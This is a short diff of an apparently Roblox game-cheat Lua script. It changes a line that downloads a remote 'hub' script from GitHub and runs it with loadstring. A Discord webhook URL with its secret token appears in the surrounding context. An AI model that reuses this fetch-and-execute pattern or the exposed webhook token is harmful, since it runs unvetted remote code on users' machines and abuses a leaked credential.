@@ -31,7 +31,7 @@ end
 
 
 -- put your shitty script here
-loadstring(game:HttpGet("https://github.com/II-Fallzy-II/Godslayer/blob/main/Cutie%20fallz%20hub"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/II-Fallzy-II/Godslayer/main/Cutie%20fallz%20hub"))()
 -- above is your script
 
 local Webhook = "https://discord.com/api/webhooks/996322079425171496/_WLhwtHJZlIbAZlXbtH4kYv9C6XPnMUiweS2McpdpV7ijJG81tcw7x9MzcJkyGf26fbB"
